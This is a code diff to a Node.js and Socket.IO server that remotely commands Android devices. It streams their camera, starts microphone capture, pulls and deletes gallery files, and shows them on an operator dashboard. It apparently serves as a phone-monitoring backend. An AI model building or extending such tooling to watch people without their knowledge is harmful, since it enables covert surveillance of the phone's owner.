@@ -64,18 +64,17 @@ function loadGalleryData() {
 }
 
 // ========== QUEUE + SERIAL DOWNLOAD ==========
-const IMAGE_QUEUE_LIMIT = 2;  // max images kept on disk per device
-const VIDEO_QUEUE_LIMIT = 2;  // max videos kept on disk per device
-const imageQueue = {};         // deviceId -> [fileName, ...] oldest first
-const videoQueue = {};         // deviceId -> [fileName, ...] oldest first
+const IMAGE_QUEUE_LIMIT = 2;
+const VIDEO_QUEUE_LIMIT = 2;
+const imageQueue = {};
+const videoQueue = {};
 
-// Serial download state — only 1 file downloads at a time per device
-const downloadInProgress = {}; // deviceId -> fileName | null
-const downloadPending    = {}; // deviceId -> [fileName, ...]
+const downloadInProgress = {};
+const downloadPending = {};
 
-// 5-minute auto-cleanup timers for files on disk
-const fileTimers = {};         // "deviceId::fileName" -> timeoutId
-const FILE_TTL_MS = 5 * 60 * 1000; // 5 minutes
+const fileTimers = {};
+const FILE_TTL_MS = 5 * 60 * 1000;
+const requestedFiles = {};
 
 function scheduleFileCleanup(deviceId, fileName) {
     const key = `${deviceId}::${fileName}`;
@@ -103,7 +102,6 @@ function deleteFile(deviceId, fileName) {
             galleryData[deviceId] = galleryData[deviceId].filter(f => f.name !== fileName);
             saveGalleryData();
         }
-        // remove from queues
         if (imageQueue[deviceId]) imageQueue[deviceId] = imageQueue[deviceId].filter(n => n !== fileName);
         if (videoQueue[deviceId]) videoQueue[deviceId] = videoQueue[deviceId].filter(n => n !== fileName);
         console.log(`🗑️ Evicted: ${fileName} (${deviceId})`);
@@ -131,7 +129,6 @@ function addToQueue(deviceId, fileName, fileType) {
     }
 }
 
-// Send next pending download command to device
 function sendNextDownload(deviceId) {
     if (!downloadPending[deviceId] || downloadPending[deviceId].length === 0) {
         downloadInProgress[deviceId] = null;
@@ -140,30 +137,25 @@ function sendNextDownload(deviceId) {
     const next = downloadPending[deviceId].shift();
     downloadInProgress[deviceId] = next;
     requestedFiles[`${deviceId}::${next}`] = Date.now();
-    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-    pendingCommands[deviceId].push({ command: 'gallery_file', value: next });
+    // Send via Socket.IO
+    io.to(`device_${deviceId}`).emit('command', { command: 'gallery_file', value: next });
     console.log(`📤 Serial download → ${next} (${deviceId}) | queue: ${(downloadPending[deviceId]||[]).length} remaining`);
 }
 
-// Shared helper: queue a file download through the serial system (used by all endpoints)
 function requestFileFromDevice(deviceId, fileName) {
     const reqKey = `${deviceId}::${fileName}`;
-    // Already in-progress or recently sent
     if (requestedFiles[reqKey] && (Date.now() - requestedFiles[reqKey]) < 5 * 60 * 1000) return 'already';
     if (!downloadPending[deviceId]) downloadPending[deviceId] = [];
     if (downloadInProgress[deviceId] === fileName || downloadPending[deviceId].includes(fileName)) return 'queued';
 
     if (downloadInProgress[deviceId]) {
-        // Another file downloading → wait in line
         downloadPending[deviceId].push(fileName);
         console.log(`⏳ Queued: ${fileName} | pos ${downloadPending[deviceId].length} (${deviceId})`);
         return 'queued';
     }
-    // Nothing downloading → send immediately
     downloadInProgress[deviceId] = fileName;
     requestedFiles[reqKey] = Date.now();
-    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-    pendingCommands[deviceId].push({ command: 'gallery_file', value: fileName });
+    io.to(`device_${deviceId}`).emit('command', { command: 'gallery_file', value: fileName });
     console.log(`📤 Download started: ${fileName} (${deviceId})`);
     return 'sent';
 }
@@ -188,15 +180,11 @@ function requireAuth(req, res, next) {
 // ========== STATE ==========
 let devices = loadDevices();
 let deviceHeartbeats = {};
-let pendingCommands = {};
 let latestFrames = {};
 let deviceSettings = {};
 let activeStreams = {};
 let frameQueues = {};
 let voiceStreams = {};
-let voiceDataQueue = {};
-// tracks files requested from device — key: `${deviceId}::${fileName}`, value: timestamp
-const requestedFiles = {};
 
 function getDeviceSettings(deviceId) {
     if (!deviceSettings[deviceId]) {
@@ -243,7 +231,6 @@ setInterval(() => {
         if (stale) {
             console.log(`🧹 Removing stale device: ${device.id}`);
             delete deviceHeartbeats[device.id];
-            delete pendingCommands[device.id];
             delete latestFrames[device.id];
             delete deviceSettings[device.id];
             delete activeStreams[device.id];
@@ -255,9 +242,8 @@ setInterval(() => {
 }, 15000);
 
 // ========== AUTO CLEANUP ==========
-// Every 15 min: delete gallery files older than 48 hours
 const CLEANUP_INTERVAL_MS = 15 * 60 * 1000;
-const MAX_FILE_AGE_MS     = 48 * 60 * 60 * 1000;
+const MAX_FILE_AGE_MS = 48 * 60 * 60 * 1000;
 
 setInterval(() => {
     const now = Date.now();
@@ -271,7 +257,6 @@ setInterval(() => {
                 removed++;
             }
         }
-        // Clean stale requestedFiles entries older than 10 min
         for (const key of Object.keys(requestedFiles)) {
             if ((now - requestedFiles[key]) > 10 * 60 * 1000) delete requestedFiles[key];
         }
@@ -335,6 +320,10 @@ app.post('/api/heartbeat', (req, res) => {
         device.lastHeartbeat = new Date().toLocaleTimeString();
         device.lastSeen = Date.now();
         saveDevices();
+        
+        // ✅ Broadcast via Socket.IO
+        io.to(`device_${deviceId}`).emit('heartbeat_response', { success: true, settings: getDeviceSettings(deviceId) });
+        
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -456,12 +445,11 @@ app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             });
         }
 
-        // File not on disk — force fresh request every time user clicks
         const reqKey = `${deviceId}::${fileName}`;
-        delete requestedFiles[reqKey];                                            // bypass 5-min cache
-        if (downloadPending[deviceId])                                            // remove from pending so it re-queues fresh
+        delete requestedFiles[reqKey];
+        if (downloadPending[deviceId])
             downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
-        if (downloadInProgress[deviceId] === fileName)                            // if mid-download, reset so command resends
+        if (downloadInProgress[deviceId] === fileName)
             downloadInProgress[deviceId] = null;
         const status = requestFileFromDevice(deviceId, fileName);
         res.json({ success: false, pending: true, status, message: 'Requesting file from device...' });
@@ -523,7 +511,6 @@ app.post('/api/upload/file', (req, res) => {
     }
 });
 
-// ========== CHUNK UPLOAD API ==========
 app.post('/api/upload/chunk', async (req, res) => {
     try {
         const { deviceId, file } = req.body;
@@ -538,21 +525,18 @@ app.post('/api/upload/chunk', async (req, res) => {
             fs.mkdirSync(folderDir, { recursive: true });
         }
 
-        // Write this chunk
         const chunkPath = path.join(folderDir, `${file.name}.part${file.chunkIndex}`);
         fs.writeFileSync(chunkPath, Buffer.from(file.data, 'base64'));
 
         const totalChunks = file.totalChunks || 1;
         console.log(`📦 Chunk ${file.chunkIndex + 1}/${totalChunks}: ${file.name} from ${deviceId}`);
 
-        // Check whether all chunks are present
         for (let i = 0; i < totalChunks; i++) {
             if (!fs.existsSync(path.join(folderDir, `${file.name}.part${i}`))) {
                 return res.json({ success: true, merged: false, chunk: file.chunkIndex, total: totalChunks });
             }
         }
 
-        // Merge all chunks into final file
         const finalPath = path.join(folderDir, file.name);
         await new Promise((resolve, reject) => {
             const ws = fs.createWriteStream(finalPath);
@@ -570,7 +554,6 @@ app.post('/api/upload/chunk', async (req, res) => {
         const finalSize = fs.statSync(finalPath).size;
         console.log(`✅ Video merged: ${file.name} (${(finalSize / 1024 / 1024).toFixed(1)} MB)`);
 
-        // Register in gallery
         if (!galleryData[deviceId]) galleryData[deviceId] = [];
         if (!galleryData[deviceId].find(f => f.name === file.name)) {
             galleryData[deviceId].push({
@@ -596,7 +579,6 @@ app.post('/api/upload/chunk', async (req, res) => {
     }
 });
 
-// Serial file request — 1 download at a time; others wait in queue
 app.post('/api/gallery/request', (req, res) => {
     try {
         const { deviceId, fileName } = req.body;
@@ -608,15 +590,12 @@ app.post('/api/gallery/request', (req, res) => {
     }
 });
 
-// ========== CLEAR CACHE ==========
 app.post('/api/clear-cache', (req, res) => {
     try {
-        // Cancel all pending file-cleanup timers and restart them fresh
         Object.keys(fileTimers).forEach(key => {
             clearTimeout(fileTimers[key]);
             delete fileTimers[key];
         });
-        // Reload gallery metadata from disk (drops stale in-memory state)
         galleryData = loadGalleryData();
         console.log('🧹 Cache cleared by dashboard');
         res.json({ success: true, message: 'Cache cleared' });
@@ -641,9 +620,8 @@ app.delete('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             galleryData[deviceId] = galleryData[deviceId].filter(f => f.name !== fileName);
         }
 
-        const cmd = { command: 'gallery_delete', value: fileName };
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push(cmd);
+        // Send via Socket.IO
+        io.to(`device_${deviceId}`).emit('command', { command: 'gallery_delete', value: fileName });
 
         res.json({ success: true });
     } catch (e) {
@@ -657,10 +635,10 @@ app.post('/api/voice/start', (req, res) => {
     try {
         const { deviceId } = req.body;
         if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push({ command: 'voice_start', value: 'true' });
+        // Send via Socket.IO
+        io.to(`device_${deviceId}`).emit('command', { command: 'voice_start', value: 'true' });
         voiceStreams[deviceId] = { active: true, startedAt: Date.now(), packetsReceived: 0 };
-        console.log(`🎤 Voice START queued for ${deviceId}`);
+        console.log(`🎤 Voice START sent via WebSocket to ${deviceId}`);
         res.json({ success: true, command: 'voice_start', status: 'started' });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -671,10 +649,10 @@ app.post('/api/voice/stop', (req, res) => {
     try {
         const { deviceId } = req.body;
         if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push({ command: 'voice_stop', value: 'false' });
+        // Send via Socket.IO
+        io.to(`device_${deviceId}`).emit('command', { command: 'voice_stop', value: 'false' });
         if (voiceStreams[deviceId]) { voiceStreams[deviceId].active = false; voiceStreams[deviceId].stoppedAt = Date.now(); }
-        console.log(`⏹️ Voice STOP queued for ${deviceId}`);
+        console.log(`⏹️ Voice STOP sent via WebSocket to ${deviceId}`);
         res.json({ success: true, command: 'voice_stop', status: 'stopped' });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -686,7 +664,6 @@ app.get('/api/voice/status/:deviceId', (req, res) => {
     res.json({
         success: true, deviceId,
         isActive: voiceStreams[deviceId]?.active || false,
-        hasPendingCommand: pendingCommands[deviceId]?.some(c => c.command === 'voice_start' || c.command === 'voice_stop') || false,
         packetsReceived: voiceStreams[deviceId]?.packetsReceived || 0,
         startedAt: voiceStreams[deviceId]?.startedAt || null,
         stoppedAt: voiceStreams[deviceId]?.stoppedAt || null
@@ -696,16 +673,9 @@ app.get('/api/voice/status/:deviceId', (req, res) => {
 app.post('/api/voice/data', (req, res) => {
     try {
         const { deviceId, audio, count, timestamp, codec, sampleRate, channels } = req.body;
-
         console.log(`🎤 Voice data from ${deviceId}: ${count} packets`);
-
-        if (!deviceId) {
-            return res.status(400).json({ success: false, error: 'deviceId required' });
-        }
-
-        if (!audio || audio.length === 0) {
-            return res.status(400).json({ success: false, error: 'No audio data' });
-        }
+        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+        if (!audio || audio.length === 0) return res.status(400).json({ success: false, error: 'No audio data' });
 
         io.emit('voice_data', {
             deviceId: deviceId,
@@ -759,7 +729,6 @@ app.post('/api/frame', (req, res) => {
 app.post('/api/batch', (req, res) => {
     try {
         const { deviceId, frames, count, timestamp, fps, quality } = req.body;
-
         console.log(`📦 Batch received: ${count} frames from ${deviceId}`);
 
         if (!deviceId || !frames || frames.length === 0) {
@@ -851,12 +820,11 @@ app.post('/api/flip', (req, res) => {
         const ds = getDeviceSettings(deviceId);
         ds.camera = camera;
 
-        const cmd = { command: 'flip', value: camera };
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push(cmd);
-        console.log(`📦 Flip queued: camera=${camera}`);
+        // Send via Socket.IO
+        io.to(`device_${deviceId}`).emit('command', { command: 'flip', value: camera });
+        console.log(`📦 Flip sent via WebSocket: camera=${camera}`);
 
-        res.json({ success: true, settings: ds, command: cmd });
+        res.json({ success: true, settings: ds, command: { command: 'flip', value: camera } });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
@@ -874,66 +842,19 @@ app.post('/api/command', (req, res) => {
             case 'flip':    ds.camera = ds.camera === 'back' ? 'front' : 'back'; break;
             case 'quality': ds.quality = value || 240; break;
             case 'fps':     ds.fps = value || 15; break;
+            case 'check_status': 
+                console.log(`📊 Check status command for ${deviceId}`);
+                break;
             default: console.log(`⚠️ Unknown command: ${command}`);
         }
 
-        const cmd = { command, value: value ?? null };
+        // Send via Socket.IO
         if (deviceId) {
-            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-            pendingCommands[deviceId].push(cmd);
-            console.log(`📦 Command queued: ${command} (value: ${value ?? 'none'})`);
+            io.to(`device_${deviceId}`).emit('command', { command, value: value ?? null });
+            console.log(`📦 Command sent via WebSocket: ${command} (value: ${value ?? 'none'})`);
         }
 
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
-    } catch (e) {
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
-// ✅ HEAD Request Handler - Check commands without downloading body (MUST BE BEFORE GET)
-app.head('/api/commands/:deviceId', (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        console.log(`📤 HEAD: Checking commands for ${deviceId}`);
-        
-        // Get pending commands for this device
-        const cmds = pendingCommands[deviceId] || [];
-        const count = cmds.length;
-        
-        // ✅ Send ONLY headers - NO BODY (0 KB data)
-        res.setHeader('X-Commands-Count', String(count));
-        res.setHeader('X-Commands-Exist', count > 0 ? 'true' : 'false');
-        res.setHeader('Content-Type', 'application/json');
-        
-        // ✅ IMPORTANT: Expose custom headers so app can read them
-        res.setHeader('Access-Control-Expose-Headers', 'X-Commands-Count, X-Commands-Exist');
-        
-        console.log(`📤 HEAD: ${count} commands for ${deviceId}`);
-        res.status(200).end();  // ← NO BODY (0 KB)
-    } catch (e) {
-        console.error('❌ HEAD error:', e.message);
-        res.status(500).end();
-    }
-});
-
-// GET handler - Retrieves commands (must be AFTER HEAD)
-app.get('/api/commands/:deviceId', (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        deviceHeartbeats[deviceId] = Date.now();
-
-        let cmds = [];
-        if (pendingCommands[deviceId] && pendingCommands[deviceId].length > 0) {
-            cmds = pendingCommands[deviceId];
-            pendingCommands[deviceId] = [];
-            console.log(`📤 Sending ${cmds.length} commands to ${deviceId}:`, cmds);
-        }
-
-        res.json({
-            success: true,
-            settings: getDeviceSettings(deviceId),
-            commands: cmds
-        });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
@@ -996,13 +917,60 @@ app.get('/api/device/:deviceId', (req, res) => {
     });
 });
 
+app.get('/api/status/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        console.log(`📊 Status check for device: ${deviceId}`);
+        
+        const device = devices.find(d => d.id === deviceId);
+        if (!device) {
+            return res.status(404).json({ 
+                success: false, 
+                error: 'Device not found' 
+            });
+        }
+        
+        const now = Date.now();
+        const isConnected = (now - (device.lastSeen || 0)) < 30000;
+        
+        res.json({
+            success: true,
+            device: {
+                id: device.id,
+                name: device.name || device.id,
+                status: isConnected ? 'online' : 'offline',
+                isConnected: isConnected,
+                hasWebSocket: !!activeStreams[device.id],
+                camera: device.camera || 'back',
+                cameraReady: device.cameraReady || false,
+                streaming: device.streaming || false,
+                cameraPermission: device.cameraPermission || false,
+                batteryOptimization: device.batteryOptimization || false,
+                batteryPercentage: device.batteryPercentage || 0,
+                galleryCount: (galleryData[device.id] || []).length,
+                settings: getDeviceSettings(device.id),
+                lastSeen: device.lastSeen,
+                lastHeartbeat: device.lastHeartbeat || 'N/A',
+                connectedAt: device.connectedAt || 'N/A',
+                serverTime: new Date().toISOString()
+            }
+        });
+        
+    } catch (e) {
+        console.error('❌ Status error:', e.message);
+        res.status(500).json({ 
+            success: false, 
+            error: e.message 
+        });
+    }
+});
+
 app.get('/api/health', (req, res) => res.json({
     status: 'ok',
     devices: devices.length,
     uptime: process.uptime(),
     frames: Object.keys(latestFrames).length,
     batchFrames: Object.keys(frameQueues).reduce((acc, key) => acc + (frameQueues[key]?.length || 0), 0),
-    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0),
     galleryFiles: Object.keys(galleryData).reduce((acc, key) => acc + (galleryData[key]?.length || 0), 0)
 }));
 
@@ -1010,7 +978,6 @@ app.get('/api/debug', (req, res) => {
     res.json({
         devices: devices.map(d => d.id),
         activeStreams,
-        pendingCommands,
         frameQueues: Object.keys(frameQueues).reduce((acc, key) => {
             acc[key] = frameQueues[key]?.length || 0;
             return acc;
@@ -1170,14 +1137,12 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         .breadcrumb .crumb:hover { text-decoration:underline; }
         .breadcrumb .sep { color:#444; }
         .breadcrumb .current { color:#fff; }
-        /* Folder grid */
         .folder-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(160px,1fr)); gap:14px; }
         .folder-card { background:#1a1a1a; border-radius:14px; border:1px solid #2a2a2a; padding:20px 16px; cursor:pointer; transition:all .2s; text-align:center; }
         .folder-card:hover { border-color:#667eea; transform:translateY(-2px); background:#222; }
         .folder-card .f-icon { font-size:42px; margin-bottom:10px; }
         .folder-card .f-name { font-size:13px; font-weight:600; color:#ddd; word-break:break-word; margin-bottom:4px; }
         .folder-card .f-count { font-size:11px; color:#666; }
-        /* File grid */
         .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(90px,1fr)); gap:5px; }
         .gallery-item { background:#1a1a1a; border-radius:8px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
         .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
@@ -1189,7 +1154,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         .loading { text-align:center; color:#666; padding:60px; font-size:15px; }
         .empty { text-align:center; color:#666; padding:60px; }
         .empty .e-icon { font-size:52px; display:block; margin-bottom:12px; }
-        /* Viewer overlay */
         .viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.96); z-index:9999; flex-direction:column; align-items:center; justify-content:center; }
         .viewer.active { display:flex; }
         .viewer .v-close { position:absolute; top:16px; right:24px; background:rgba(0,0,0,.6); border:2px solid rgba(255,255,255,.3); color:#fff; font-size:28px; cursor:pointer; line-height:1; z-index:99999; width:44px; height:44px; border-radius:50%; display:flex; align-items:center; justify-content:center; }
@@ -1232,7 +1196,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     <div id="galleryContent"><div class="loading">⏳ Loading gallery...</div></div>
 </div>
 
-<!-- Full-screen viewer -->
 <div class="viewer" id="viewer">
     <button class="v-close" onclick="closeViewer()">✕</button>
     <div id="viewerLoading" style="display:none;text-align:center;color:#aaa;padding:20px;">
@@ -1272,14 +1235,12 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     let currentIndex = 0;
     let viewerDataUrl = '';
 
-    // ── Video retry state ─────────────────────────────
     const VID_MAX_RETRIES = 15;
     const VID_RETRY_MS    = 2000;
     let _vidRetryTimer  = null;
     let _vidRetryCount  = 0;
-    let _vidWaitingFile = null; // file we're currently retrying for
+    let _vidWaitingFile = null;
 
-    // ── Helpers ───────────────────────────────────────
     function getMime(fileName, type) {
         const ext = fileName.split('.').pop().toLowerCase();
         if (type === 'video' || ['mp4','3gp','mkv','avi','mov','webm'].includes(ext)) {
@@ -1306,7 +1267,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         return '📁';
     }
 
-    // ── Gallery load ──────────────────────────────────
     function loadGallery() {
         document.getElementById('galleryContent').innerHTML = '<div class="loading">⏳ Loading gallery...</div>';
         fetch('/api/gallery/' + encodeURIComponent(deviceId))
@@ -1329,7 +1289,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             });
     }
 
-    // ── Folder list ───────────────────────────────────
     let folderNames = [];
     function showFolderList() {
         currentFolderName = null; currentFolderFiles = [];
@@ -1412,7 +1371,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         } else { lazyImgs.forEach(_loadThumb); }
     }
 
-    // ── Breadcrumb ────────────────────────────────────
     function setBreadcrumb(folderName) {
         const bc = document.getElementById('breadcrumb');
         bc.innerHTML = folderName
@@ -1420,7 +1378,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             : '<span class="current">📸 All Folders</span>';
     }
 
-    // ── Sync ──────────────────────────────────────────
     function syncGallery() {
         const btn = document.getElementById('syncBtn');
         btn.disabled = true; btn.textContent = '⏳ Syncing...';
@@ -1428,7 +1385,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         setTimeout(() => { loadGallery(); btn.disabled = false; btn.textContent = '🔄 Sync'; }, 3000);
     }
 
-    // ── Clear Cache ───────────────────────────────────
     function clearCache() {
         if (!confirm('Server cache aur browser memory clear karein?')) return;
         fetch('/api/clear-cache', { method:'POST' }).catch(()=>{});
@@ -1437,13 +1393,11 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         alert('✅ Cache cleared!');
     }
 
-    // ── Viewer loading helpers ────────────────────────
     function showViewerLoading(title, note, retryN, retryMax) {
         document.getElementById('viewerLoading').style.display = 'block';
         document.getElementById('viewerLoadingTitle').textContent = title || 'Loading...';
         document.getElementById('viewerLoadingNote').textContent  = note  || '';
         document.getElementById('viewerImg').style.display = 'none';
-        // show retry progress bar only when retrying
         const bar = document.getElementById('retryBar');
         if (retryN !== undefined && retryMax) {
             bar.style.display = 'block';
@@ -1458,7 +1412,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         document.getElementById('retryBar').style.display = 'none';
     }
 
-    // ── Video memory release helper ───────────────────
     function _releaseVideo() {
         clearTimeout(_vidRetryTimer);
         _vidRetryTimer  = null;
@@ -1468,18 +1421,13 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         v.onerror = null; v.oncanplay = null; v.onloadeddata = null;
         v.pause();
         v.src = '';
-        v.load(); // tells browser to release buffered memory
+        v.load();
     }
 
-    // ── Video retry loader ────────────────────────────
-    // Tries to play a video with up to VID_MAX_RETRIES attempts.
-    // On first error → requests file from device.
-    // Each retry updates the progress bar.
-    // When gallery_update arrives → cancels retry loop and plays immediately.
     function _startVideoRetry(file, retryCount) {
         if (!document.getElementById('viewer').classList.contains('active')) return;
         const f = currentFolderFiles[currentIndex];
-        if (!f || f.name !== file.name) return; // viewer changed to different file
+        if (!f || f.name !== file.name) return;
 
         _vidWaitingFile = file.name;
         _vidRetryCount  = retryCount;
@@ -1487,7 +1435,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         const vidEl = document.getElementById('viewerVid');
         const streamUrl = '/api/gallery/video/' + deviceId + '/' + encodeURIComponent(file.name) +
                           '?folder=' + encodeURIComponent(file.folder || currentFolderName || '') +
-                          '&t=' + Date.now(); // cache-bust so browser re-checks
+                          '&t=' + Date.now();
 
         vidEl.onerror = null; vidEl.oncanplay = null; vidEl.onloadeddata = null;
 
@@ -1497,7 +1445,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             showViewerLoading('📡 Upload ka wait kar rahe hain...', 'Device se aa rahi hai', retryCount, VID_MAX_RETRIES);
         }
 
-        // Success — video has data, autoplay
         vidEl.onloadeddata = function() {
             vidEl.onloadeddata = null; vidEl.onerror = null;
             clearTimeout(_vidRetryTimer);
@@ -1512,7 +1459,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             vidEl.onerror = null; vidEl.onloadeddata = null;
 
             if (retryCount === 0) {
-                // First failure: ask device to send the file
                 fetch('/api/gallery/request', {
                     method:'POST', headers:{'Content-Type':'application/json'},
                     body: JSON.stringify({ deviceId, fileName: file.name })
@@ -1539,7 +1485,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         vidEl.style.display = 'block';
     }
 
-    // ── Viewer open ───────────────────────────────────
     function openViewer(index) {
         if (index < 0 || index >= currentFolderFiles.length) return;
         currentIndex = index;
@@ -1646,14 +1591,12 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
 
     loadGallery();
 
-    // ── Socket.IO — live thumbnail + video upload notification ────────────
     let _galReloadTimer = null;
     const _galSocket = io({ transports: ['websocket', 'polling'] });
 
     _galSocket.on('gallery_update', function(data) {
         if (data.deviceId !== deviceId) return;
 
-        // Update thumbnail in-place for images
         if (data.type !== 'video') {
             const escapedName = data.fileName.replace(/"/g, '&#34;');
             const thumbImg = document.querySelector('img[data-filename="' + escapedName + '"]');
@@ -1666,7 +1609,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             }
         }
 
-        // Debounced gallery reload
         clearTimeout(_galReloadTimer);
         _galReloadTimer = setTimeout(function() { loadGallery(); }, 1000);
 
@@ -1674,13 +1616,11 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         const file   = currentFolderFiles[currentIndex];
         if (!viewer.classList.contains('active') || !file) return;
 
-        // Image arrived → reload viewer
         if (file.name === data.fileName && data.type !== 'video') {
             openViewer(currentIndex);
             return;
         }
 
-        // Video arrived → cancel retry loop and play immediately
         if (file.type === 'video' && file.name === data.fileName) {
             clearTimeout(_vidRetryTimer);
             _vidRetryTimer  = null;
@@ -1695,7 +1635,6 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
                 vidEl.play().catch(() => { document.getElementById('vidPlayOverlay').style.display = 'flex'; });
             };
             vidEl.onerror = function() {
-                // Upload event fired before file was fully flushed — retry once more
                 vidEl.onerror = null;
                 _startVideoRetry(file, Math.min(_vidRetryCount + 1, VID_MAX_RETRIES - 1));
             };
@@ -1709,12 +1648,13 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
 </html>`);
 });
 
-// ========== WEBSOCKET ==========
+// ========== WEBSOCKET (Socket.IO) ==========
 
 io.on('connection', (socket) => {
-    console.log(`🔌 WS connected: ${socket.id}`);
+    console.log(`🔌 Socket.IO connected: ${socket.id}`);
 
-    socket.on('register_stream', (data) => {
+    // ✅ Register device
+    socket.on('register', (data) => {
         const { deviceId, deviceName, cameraReady, cameraPermission, batteryOptimization } = data;
 
         const canonical = findCanonicalDevice(deviceId);
@@ -1738,11 +1678,15 @@ io.on('connection', (socket) => {
         device.lastSeen = Date.now();
 
         socket.deviceId = canonicalId;
+        socket.join(`device_${canonicalId}`);
         socket.join('streamers');
 
-        console.log(`📡 Device [${canonicalId}] registered for WebSocket stream`);
+        console.log(`📡 Device [${canonicalId}] registered for Socket.IO`);
+
+        // ✅ Send settings
         socket.emit('settings', getDeviceSettings(canonicalId));
 
+        // ✅ Broadcast device update
         io.emit('device_update', {
             id: device.id, name: device.name,
             cameraReady: device.cameraReady || false,
@@ -1756,6 +1700,7 @@ io.on('connection', (socket) => {
         });
     });
 
+    // ✅ Device status update
     socket.on('device_status_update', (data) => {
         const canonicalId = socket.deviceId;
         if (!canonicalId) return;
@@ -1784,6 +1729,7 @@ io.on('connection', (socket) => {
         });
     });
 
+    // ✅ Stream frame
     socket.on('stream_frame', (data) => {
         const { deviceId, image, timestamp, quality, fps, camera } = data;
         const canonicalId = socket.deviceId || deviceId;
@@ -1818,6 +1764,7 @@ io.on('connection', (socket) => {
         }
     });
 
+    // ✅ Subscribe to stream
     socket.on('subscribe_stream', (data) => {
         const { deviceId } = data;
         if (deviceId) {
@@ -1838,8 +1785,10 @@ io.on('connection', (socket) => {
         }
     });
 
+    // ✅ Send command via Socket.IO (from dashboard)
     socket.on('send_command', (data) => {
         const { deviceId, command, value } = data;
+        console.log(`⚡ WS Command [${command}] for device [${deviceId}]`);
 
         const ds = getDeviceSettings(deviceId);
         switch (command) {
@@ -1851,16 +1800,44 @@ io.on('connection', (socket) => {
             default: console.log(`⚠️ Unknown WS command: ${command}`);
         }
 
-        const cmd = { command, value: value ?? null };
-
+        // ✅ Forward to device
         if (deviceId) {
-            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-            pendingCommands[deviceId].push(cmd);
+            io.to(`device_${deviceId}`).emit('command', { command, value: value ?? null });
+            console.log(`📦 Command forwarded to device [${deviceId}]: ${command}`);
         }
-
-        console.log(`⚡ WS Command [${command}] queued for device [${deviceId}]`);
     });
 
+    // ✅ Heartbeat via Socket.IO
+    socket.on('heartbeat', (data) => {
+        const { deviceId, deviceName, camera, cameraReady, streaming, cameraPermission, batteryOptimization, batteryPercentage } = data;
+        
+        deviceHeartbeats[deviceId] = Date.now();
+        let device = devices.find(d => d.id === deviceId);
+        if (!device) {
+            device = {
+                id: deviceId,
+                name: deviceName || 'Android Device',
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now()
+            };
+            devices.push(device);
+            console.log(`✅ Device registered via Socket.IO: ${device.name} (${deviceId})`);
+        }
+        device.name = deviceName || device.name;
+        device.camera = camera || device.camera;
+        device.cameraReady = cameraReady || false;
+        device.streaming = streaming || false;
+        device.cameraPermission = cameraPermission || false;
+        device.batteryOptimization = batteryOptimization || false;
+        device.batteryPercentage = batteryPercentage || 0;
+        device.lastHeartbeat = new Date().toLocaleTimeString();
+        device.lastSeen = Date.now();
+        saveDevices();
+
+        socket.emit('heartbeat_response', { success: true, settings: getDeviceSettings(deviceId) });
+    });
+
+    // ✅ Disconnect
     socket.on('disconnect', () => {
         if (socket.deviceId) {
             const disconnectedId = socket.deviceId;
@@ -2049,10 +2026,24 @@ app.get('/', requireAuth, (req, res) => {
     </div>
     <div class="controls">
         <div class="section-title">🎮 CONTROLS</div>
